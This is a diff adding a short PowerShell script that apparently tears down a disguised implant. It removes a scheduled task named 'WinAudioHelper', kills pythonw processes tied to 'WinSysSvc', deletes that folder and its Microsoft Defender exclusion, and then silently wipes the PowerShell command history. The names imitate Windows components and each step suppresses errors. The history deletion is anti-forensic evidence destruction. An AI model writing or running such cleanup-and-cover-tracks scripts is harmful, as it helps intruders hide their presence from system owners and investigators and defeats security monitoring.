@@ -1,0 +1,7 @@
+Stop-ScheduledTask -TaskName "WinAudioHelper" -ErrorAction SilentlyContinue
+Unregister-ScheduledTask -TaskName "WinAudioHelper" -Confirm:$false -ErrorAction SilentlyContinue
+Get-CimInstance Win32_Process -Filter "Name='pythonw.exe'" | Where-Object { $_.CommandLine -like '*WinSysSvc*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
+Remove-Item -Path "C:\ProgramData\WinSysSvc" -Recurse -Force -ErrorAction SilentlyContinue
+Remove-MpPreference -ExclusionPath "C:\ProgramData\WinSysSvc" -ErrorAction SilentlyContinue
+Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
+exit
